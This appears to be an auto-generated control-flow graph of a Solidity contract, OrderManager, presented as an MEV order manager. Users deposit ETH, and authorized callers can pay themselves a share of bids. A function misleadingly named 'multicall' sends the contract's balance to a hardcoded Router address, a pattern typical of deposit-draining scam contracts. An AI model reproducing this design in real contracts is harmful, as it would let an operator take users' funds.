@@ -1,0 +1,308 @@
+Contract: OrderManager
+==================================================
+
+Function: constructor
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: admin = msg.sender
+
+Edges:
+  0 -> 1
+
+Function: submitTransaction
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(msg.value == value,Incorrect value sent)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: transactions.push(Transaction({sender:msg.sender,target:target,value:value,gasPrice:gasPrice,bid:bid}))
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: totalFee += msg.value
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: TransactionSubmitted(msg.sender,target,value,gasPrice,bid)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+
+Function: enableBet
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(transactions.length > 0,No transactions available)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: selectedTransaction = getHighestBidTransaction()
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: extractedProfit = calculateProfit(selectedTransaction)
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: address(msg.sender).transfer(extractedProfit)
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: totalFee -= extractedProfit
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: removeTransaction(selectedTransaction)
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: MEVExtracted(msg.sender,extractedProfit)
+
+  ID: 8
+  Type: NodeType.EXPRESSION
+  Expression: onlyAuthorized()
+
+Edges:
+  0 -> 8
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+  8 -> 1
+
+Function: getHighestBidTransaction
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(transactions.length > 0,No transactions available)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: highestBidTransaction = transactions[0]
+
+  ID: 3
+  Type: NodeType.STARTLOOP
+  Expression: 
+
+  ID: 4
+  Type: NodeType.ENDLOOP
+  Expression: 
+
+  ID: 5
+  Type: NodeType.VARIABLE
+  Expression: i = 1
+
+  ID: 6
+  Type: NodeType.IFLOOP
+  Expression: i < transactions.length
+
+  ID: 7
+  Type: NodeType.IF
+  Expression: transactions[i].bid > highestBidTransaction.bid
+
+  ID: 8
+  Type: NodeType.EXPRESSION
+  Expression: highestBidTransaction = transactions[i]
+
+  ID: 9
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 10
+  Type: NodeType.EXPRESSION
+  Expression: i ++
+
+  ID: 11
+  Type: NodeType.RETURN
+  Expression: highestBidTransaction
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 5
+  3 -> 6
+  4 -> 11
+  5 -> 3
+  6 -> 7
+  6 -> 4
+  7 -> 8
+  7 -> 9
+  8 -> 9
+  9 -> 10
+  10 -> 6
+
+Function: calculateProfit
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: profitPercentage = 10
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: (transaction.bid * profitPercentage) / 100
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: removeTransaction
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.STARTLOOP
+  Expression: 
+
+  ID: 2
+  Type: NodeType.ENDLOOP
+  Expression: 
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: i = 0
+
+  ID: 4
+  Type: NodeType.IFLOOP
+  Expression: i < transactions.length
+
+  ID: 5
+  Type: NodeType.IF
+  Expression: transactions[i].sender == transaction.sender && transactions[i].target == transaction.target && transactions[i].value == transaction.value && transactions[i].gasPrice == transaction.gasPrice && transactions[i].bid == transaction.bid
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: transactions[i] = transactions[transactions.length - 1]
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: transactions.pop()
+
+  ID: 8
+  Type: NodeType.BREAK
+  Expression: 
+
+  ID: 9
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 10
+  Type: NodeType.EXPRESSION
+  Expression: i ++
+
+Edges:
+  0 -> 3
+  1 -> 4
+  3 -> 1
+  4 -> 5
+  4 -> 2
+  5 -> 6
+  5 -> 9
+  6 -> 7
+  7 -> 8
+  8 -> 2
+  9 -> 10
+  10 -> 4
+
+Function: multicall
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(amount > 0,Amount must be greater than 0)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(address(this).balance >= amount,Insufficient balance)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: address(Router).transfer(amount)
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: MulticallExecuted(Router,amount)
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: onlyAuthorized()
+
+Edges:
+  0 -> 5
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  5 -> 1
+
+Function: addLP
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: onlyAuthorized()
+
+Edges:
+  0 -> 1
+
+Function: receive
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+Edges:
+
+Function: slitherConstructorVariables
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: Router = 0xcF7b721EB846487e77D3597F593e2c36Ab91AeA9
+
+Edges:
+
+
